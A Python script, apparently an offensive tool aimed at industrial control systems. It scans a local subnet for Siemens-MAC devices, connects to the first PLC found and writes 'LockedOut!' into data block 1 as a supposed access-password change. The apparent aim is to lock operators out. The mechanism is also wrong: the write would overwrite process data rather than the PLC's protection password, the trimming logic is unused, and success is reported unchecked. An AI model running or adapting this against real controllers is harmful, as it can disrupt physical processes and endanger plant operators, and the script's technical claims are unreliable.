import snap7
import struct
from snap7.util import set_string
from scapy.all import ARP, Ether, srp
import socket
import time

def find_plc():
    """Finds Siemens S7 PLC on the network using ARP scan."""
    
    # Define the network range (modify according to your network)
    target_ip_range = "192.168.1.0/24"  

    print("[*] Scanning network for Siemens S7 PLC...")

    # Create an ARP request packet
    arp_request = ARP(pdst=target_ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    
    # Send the packet and receive responses
    result = srp(packet, timeout=3, verbose=False)[0]
    
    for sent, received in result:
        # Check Siemens MAC prefix (Siemens MAC typically starts with 00:0E:8C)
        if received.hwsrc.startswith("00:0E:8C"):
            print(f"[+] Siemens PLC found at IP: {received.psrc} with MAC: {received.hwsrc}")
            return received.psrc
    
    print("[-] No Siemens PLC found.")
    return None

def change_plc_password(plc_ip, new_password):
    """Changes the access password of S7-1200 PLC using S7 communication."""

    try:
        # Connect to PLC
        plc = snap7.client.Client()
        print(f"[*] Connecting to PLC at {plc_ip}...")
        plc.connect(plc_ip, 0, 1)  # Default Rack=0, Slot=1 for S7-1200

        # Check connection status
        if not plc.get_connected():
            print("[-] Connection to PLC failed.")
            return

        print("[+] Connected to PLC. Attempting to change password...")

        # Define the area where the password is stored
        db_number = 1  # Modify depending on setup
        start_address = 0  
        
        # Prepare new password payload
        password_length = 8  # Siemens allows up to 8-character passwords for some models
        new_password_encoded = new_password.encode('utf-8')
        
        # Ensure password fits within the allowed size
        if len(new_password_encoded) > password_length:
            print("[-] Password too long! Trimming to 8 characters.")
            new_password_encoded = new_password_encoded[:password_length]
        
        # Create a data buffer and write the password
        data = bytearray(password_length)
        set_string(data, 0, new_password, password_length)  

        # Write the new password to PLC memory
        plc.db_write(db_number, start_address, data)

        print(f"[+] Password changed successfully to '{new_password}'.")

        # Close connection
        plc.disconnect()

    except Exception as e:
        print(f"[-] Error changing password: {str(e)}")

if __name__ == "__main__":
    # Step 1: Find Siemens PLC
    plc_ip = find_plc()
    if plc_ip:
        # Step 2: Change Credentials
        new_password = "LockedOut!"  # Change to desired test password
        change_plc_password(plc_ip, new_password)
    else:
        print("[-] No PLC detected. Exiting.")